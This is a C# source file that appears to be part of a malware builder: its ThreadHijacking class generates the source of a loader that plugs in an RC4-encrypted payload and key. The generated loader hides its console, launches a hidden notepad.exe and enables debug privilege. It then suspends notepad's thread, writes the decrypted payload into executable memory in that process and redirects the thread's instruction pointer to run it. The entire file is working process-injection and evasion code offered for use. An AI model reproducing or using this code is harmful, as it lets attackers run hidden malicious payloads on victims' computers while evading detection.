using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WindowsFormsApp1
{
    class ThreadHijacking
    {
        String code;

        public ThreadHijacking(String decKey, String encPayload)
        {
            code = @"using System;
                                using System.Collections.Generic;
                                using System.Linq;
                                using System.Runtime.InteropServices;
                                using System.Diagnostics;
                                using System.Threading;

                       namespace Loader
                       {
                        static class Decryptor
                        {
                            public static byte[] Decrypt(byte[] key, byte[] data)
                            {
                                return EncryptOutput(key, data).ToArray();
                            }
                            private static byte[] EncryptInitalize(byte[] key)
                            {
                                byte[] s = Enumerable.Range(0, 256)
                                  .Select(i => (byte)i)
                                  .ToArray();

                                for (int i = 0, j = 0; i < 256; i++)
                                {
                                    j = (j + key[i % key.Length] + s[i]) & 255;

                                    Swap(s, i, j);
                                }

                                return s;
                            }
                            private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
                            {
                                byte[] s = EncryptInitalize(key);

                                int i = 0;
                                int j = 0;

                                return data.Select((b) =>
                                {
                                    i = (i + 1) & 255;
                                    j = (j + s[i]) & 255;

                                    Swap(s, i, j);

                                    return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                                });
                            }
                            private static void Swap(byte[] s, int i, int j)
                            {
                                byte c = s[i];

                                s[i] = s[j];
                                s[j] = c;
                            }

                        }
                            public static class ConstantsAndExtCalls
                            {
                                public const ulong WAIT_TIMEOUT = 0xffffffff;
                                public const int PROCESS_CREATE_THREAD = 0x0002;
                                public const int PROCESS_QUERY_INFORMATION = 0x0400;
                                public const int PROCESS_VM_OPERATION = 0x0008;
                                public const int PROCESS_VM_WRITE = 0x0020;
                                public const int PROCESS_VM_READ = 0x0010;
                                public const uint MEM_RESERVE = 0x00002000;
                                public const uint PAGE_READWRITE = 4;
                                public const int SW_HIDE = 0;
                                public const int SW_SHOW = 5;
                                public const int VIRTUAL_MEM = (0x1000 | 0x2000);
                                public static UInt32 MEM_COMMIT = 0x1000;
                                public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                                public static int PROCCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF);

                                public struct THREADENTRY32
                                {
                                    public uint dwSize;
                                    public uint cntUsage;
                                    public uint th32OwnerProcessID;
                                    public uint tpBasePri;
                                    public uint tpDeltaPri;
                                    public uint dwFlags;
                                }
                                public enum CONTEXT_FLAGS : uint
                                {
                                    CONTEXT_i386 = 0x10000,
                                    CONTEXT_i486 = 0x10000,   //  same as i386
                                    CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
                                    CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
                                    CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
                                    CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
                                    CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
                                    CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
                                    CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
                                    CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
                                }

           
                                                                // x64 m128a
                                                                [StructLayout(LayoutKind.Sequential)]
                                                                public struct M128A
                                                                {
                                                                    public ulong High;
                                                                    public long Low;

                                                                    public override string ToString()
                                                                    {
                                                    return string.Format(""High: { 0}, Low: { 1}"", this.High, this.Low);
                                                }
                                    }

                                        // x64 save format
                                        [StructLayout(LayoutKind.Sequential, Pack = 16)]
                                        public struct XSAVE_FORMAT64
                                        {
                                            public ushort ControlWord;
                                            public ushort StatusWord;
                                            public byte TagWord;
                                            public byte Reserved1;
                                            public ushort ErrorOpcode;
                                            public uint ErrorOffset;
                                            public ushort ErrorSelector;
                                            public ushort Reserved2;
                                            public uint DataOffset;
                                            public ushort DataSelector;
                                            public ushort Reserved3;
                                            public uint MxCsr;
                                            public uint MxCsr_Mask;

                                            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                                            public M128A[] FloatRegisters;

                                            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
                                            public M128A[] XmmRegisters;

                                            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
                                            public byte[] Reserved4;
                                        }

                                        // x64 context structure
                                        [StructLayout(LayoutKind.Sequential, Pack = 16)]
                                        public struct CONTEXT64
                                        {
                                            public ulong P1Home;
                                            public ulong P2Home;
                                            public ulong P3Home;
                                            public ulong P4Home;
                                            public ulong P5Home;
                                            public ulong P6Home;

                                            public CONTEXT_FLAGS ContextFlags;
                                            public uint MxCsr;

                                            public ushort SegCs;
                                            public ushort SegDs;
                                            public ushort SegEs;
                                            public ushort SegFs;
                                            public ushort SegGs;
                                            public ushort SegSs;
                                            public uint EFlags;

                                            public ulong Dr0;
                                            public ulong Dr1;
                                            public ulong Dr2;
                                            public ulong Dr3;
                                            public ulong Dr6;
                                            public ulong Dr7;

                                            public ulong Rax;
                                            public ulong Rcx;
                                            public ulong Rdx;
                                            public ulong Rbx;
                                            public ulong Rsp;
                                            public ulong Rbp;
                                            public ulong Rsi;
                                            public ulong Rdi;
                                            public ulong R8;
                                            public ulong R9;
                                            public ulong R10;
                                            public ulong R11;
                                            public ulong R12;
                                            public ulong R13;
                                            public ulong R14;
                                            public ulong R15;
                                            public ulong Rip;

                                            public XSAVE_FORMAT64 DUMMYUNIONNAME;

                                            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
                                            public M128A[] VectorRegister;
                                            public ulong VectorControl;

                                            public ulong DebugControl;
                                            public ulong LastBranchToRip;
                                            public ulong LastBranchFromRip;
                                            public ulong LastExceptionToRip;
                                            public ulong LastExceptionFromRip;
                                        }

                                        public enum ThreadAccess : int
                                        {
                                            TERMINATE = (0x0001),
                                            SUSPEND_RESUME = (0x0002),
                                            GET_CONTEXT = (0x0008),
                                            SET_CONTEXT = (0x0010),
                                            SET_INFORMATION = (0x0020),
                                            QUERY_INFORMATION = (0x0040),
                                            SET_THREAD_TOKEN = (0x0080),
                                            IMPERSONATE = (0x0100),
                                            DIRECT_IMPERSONATION = (0x0200),
                                            THREAD_ALL_ACCESS = (0X001F03FF)

                                        }

                                        [DllImport(""Kernel32.dll"", SetLastError = true)]
                                        public static extern int SuspendThread(IntPtr hthread);

                                        [DllImport(""Kernel32.dll"", SetLastError = true)]
                                        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheriteHandle, uint dwThreadId);

                                        [DllImport(""Kernel32.dll"", SetLastError = true)]
                                        public static extern bool GetThreadContext(IntPtr hthread, ref CONTEXT64 lpContext);

                                        [DllImport(""ntdll.dll"", SetLastError = true)]
                                        public static extern IntPtr RtlAdjustPrivilege(int Priviledge, bool bEnablePriviledge, bool IsThreadPriviledge, out bool PreviousValue);

                                            [DllImport(""Kernel32.dll"", SetLastError = true)]
                                            public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 hContext);

                                        [DllImport(""Kernel32.dll"", SetLastError = true)]
                                        public static extern bool ResumeThread(IntPtr hThread);

                                        [DllImport(""Kernel32.dll"", SetLastError = true)]
                                        public static extern bool WriteProcessMemory(int hProcess, UInt64 lpBaseAddress, byte[] lpBuffer, int dwSize, ref UInt64 lpNumberofBytesWritten);

                                        [DllImport(""Kernel32.dll"", SetLastError = true)]
                                        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

                                        [DllImport(""Kernel32.dll"", SetLastError = true, ExactSpelling = true)]
                                        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

                                        [DllImport(""Kernel32.dll"")]
                                        public static extern bool CloseHandle(IntPtr handle);

                                        [DllImport(""Kernel32.dll"")]
                                        public static extern UInt32 GetProcAddress(IntPtr hModule, string procName);

                                        [DllImport(""Kernel32.dll"")]
                                        public static extern UInt32 GetLastError();

                                        [DllImport(""Kernel32.dll"")]
                                        public static extern IntPtr GetConsoleWindow();

                                        [DllImport(""user32.dll"")]
                                        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

                                        [DllImport(""kernel32.dll"", SetLastError = true)]
                                        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, ulong dwMilliseconds);

                                    }


                                    class Program
                                    {


                                        static void Main(string[] args)
                                        {
                                            //hide console window

                                            var handle = ConstantsAndExtCalls.GetConsoleWindow();
                                            ConstantsAndExtCalls.ShowWindow(handle, ConstantsAndExtCalls.SW_HIDE);

                                            //start the host process in the background
                                            Process p = new Process();
                                            p.StartInfo = new ProcessStartInfo(""notepad.exe"");
                                            
                                            p.StartInfo.CreateNoWindow = true;

                                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                            p.Start();
                                            var procId = p.Id;


                                            bool bl;
                                            UInt64 dwThreadId = 0;

                                            //context struct for the hijacking 
                                            ConstantsAndExtCalls.CONTEXT64 hijacking_ctx = new ConstantsAndExtCalls.CONTEXT64();

                                            //content of the original struct
                                            //ConstantsAndExtCalls.CONTEXT64 original_ctx = new ConstantsAndExtCalls.CONTEXT64();

                                            //set debug priviledge
                                            ConstantsAndExtCalls.RtlAdjustPrivilege(20, true, false, out bl);

                                            p.Refresh();
                                            var handle_1 = ConstantsAndExtCalls.OpenProcess(ConstantsAndExtCalls.PROCCESS_ALL_ACCESS, false, (int) procId);
                                            ProcessThreadCollection ptc = p.Threads;
                                            var htreadHandle = ptc[0].Id;
                                                
                                            var hThrHandle = ConstantsAndExtCalls.OpenThread(ConstantsAndExtCalls.ThreadAccess.THREAD_ALL_ACCESS, false, (uint)htreadHandle);
                                            if (hThrHandle == IntPtr.Zero) Environment.Exit(1);



                                            String Payload_Encrypted = """ + encPayload +
                                            @""";string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
                                            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
                                            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
                                            {
                                                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                                                _X_to_Bytes[i] = current;
                                            }
                                            byte[] KEY = {" + decKey + @"};
                                            byte[] final_payload = Decryptor.Decrypt(KEY, _X_to_Bytes);
                                           
                                           

                                            //original_ctx.ContextFlags = ConstantsAndExtCalls.CONTEXT_FLAGS.CONTEXT_FULL;
                                            hijacking_ctx.ContextFlags = ConstantsAndExtCalls.CONTEXT_FLAGS.CONTEXT_FULL;

                                            ConstantsAndExtCalls.SuspendThread(hThrHandle);
                                            
                                            bl = ConstantsAndExtCalls.GetThreadContext(hThrHandle, ref hijacking_ctx);
                                            //bl = ConstantsAndExtCalls.GetThreadContext(hThrHandle, ref original_ctx);



                                            IntPtr funcAddress = ConstantsAndExtCalls.VirtualAllocEx(handle_1, IntPtr.Zero, (UInt32)final_payload.Length, ConstantsAndExtCalls.VIRTUAL_MEM, ConstantsAndExtCalls.PAGE_EXECUTE_READWRITE);
 

                                            ConstantsAndExtCalls.WriteProcessMemory((int)handle_1, (UInt64)funcAddress, final_payload,  final_payload.Length, ref dwThreadId);

                                            //set the new Rip address
                                            hijacking_ctx.Rip = (ulong)(funcAddress);

                                            //set the new Context to the hijacked thread
                                            bl = ConstantsAndExtCalls.SetThreadContext(hThrHandle, ref hijacking_ctx);

                                            //resume the thread
                                            ConstantsAndExtCalls.ResumeThread(hThrHandle);

                                            //ConstantsAndExtCalls.WaitForSingleObject(hThrHandle,ConstantsAndExtCalls.WAIT_TIMEOUT);
                                            //restore context
                                            //ConstantsAndExtCalls.SuspendThread(hThrHandle);
                                            //bl = ConstantsAndExtCalls.SetThreadContext(hThrHandle, ref original_ctx);
                                            //ConstantsAndExtCalls.ResumeThread(hThrHandle);
                                            //bl = ConstantsAndExtCalls.GetThreadContext(hThrHandle, ref ctx);

                                            //close the handles and end the host process 
                                            

                                            ConstantsAndExtCalls.CloseHandle(hThrHandle);

                                            ConstantsAndExtCalls.CloseHandle(handle_1);
                                           // p.Close();


                                            }

                                        }
   
                                }";


        }
        public String GetCode()
        {
            return code;
        }
    }
}
